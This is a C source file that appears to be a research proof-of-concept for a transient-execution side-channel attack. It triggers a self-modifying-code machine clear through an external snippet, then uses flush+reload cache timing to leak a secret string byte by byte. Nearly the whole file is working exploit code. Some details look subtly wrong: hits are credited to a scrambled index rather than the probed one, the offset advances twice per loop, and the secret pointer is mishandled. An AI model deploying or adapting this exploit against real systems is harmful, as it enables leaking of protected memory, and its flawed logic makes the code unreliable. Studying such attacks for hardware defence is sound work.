#include "printf.c"
#include "cache.h"
#include <stdint.h>

#define MAGIC_NUMBER 0xdeadbeef

#define SECRET_SZ 12
#define ATTACK_SAME_ROUNDS 10
#define CACHE_HIT_THRESHOLD 50

/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint32_t* inArray, uint32_t inArraySize, uint8_t* outIdxArray, uint32_t* outValArray){
    outValArray[0] = 0;
    outValArray[1] = 0;

    for (uint32_t i = 0; i < inArraySize; ++i){
        if (inArray[i] > outValArray[0]){
            outValArray[1] = outValArray[0];
            outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0];
            outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]){
            outValArray[1] = inArray[i];
            outIdxArray[1] = i;
        }
    }
}

extern uint32_t smc_snippet();
extern const char* secret;

uint8_t unused1[64*64];
uint8_t reload_buf[256 * L1_BLOCK_SZ_BYTES];
uint8_t unused2[64*64];
static uint32_t results[256];

int main(void){
  uint8_t* secretPtr = &secret;
  printf("Starting...\r\n");
  for (uint32_t offset = 0; offset < sizeof(secret); ++offset){
    // printf("Searching for secret #%d, addr:0x%x, value(dec):%d, reload_buf:0x%x\n", offset, (uint8_t*)((uint32_t)secretPtr + offset), secretPtr[offset], &reload_buf);
    for(uint32_t cIdx = 0; cIdx < 256; ++cIdx){
        results[cIdx] = 0;
    }
    // run the attack on the same idx ATTACK_SAME_ROUNDS times
    for(uint32_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
        // make sure array you read from is not in the cache
        flushCache((uint32_t)&reload_buf, sizeof(reload_buf));

        uint32_t smc_number = smc_snippet(reload_buf, offset);
        if(smc_number != MAGIC_NUMBER) {
            printf("Machine clear failed or non-existent! smc_number:0x%x\n", smc_number);
            return -1;
        }

        uint8_t dummy = 0;
        uint32_t start, diff;
        for (uint32_t i = 0; i < 256; ++i){
            uint32_t mix_i = ((i * 167) + 13) & 255;
            start = get_mcycle();
            dummy &= reload_buf[i*L1_BLOCK_SZ_BYTES];
            diff = (get_mcycle() - start);
            if ( diff < CACHE_HIT_THRESHOLD ){
                results[mix_i] += 1;
            }
        }
    }
    // get highest and second highest result hit values
    uint8_t output[2];
    uint32_t hitArray[2];
    topTwoIdx(results, 256, output, hitArray);
    printf("m[0x%x] = want(%c) =?= guess(hits,dec,char) 1.(%d, %d, %c) 2.(%d, %d, %c)\n", 
        (uint8_t*)((uint32_t)secretPtr + offset),
        secretPtr[offset],
        hitArray[0], output[0], output[0],
        hitArray[1], output[1], output[1]);

    ++offset;
  }

  return 1;
}
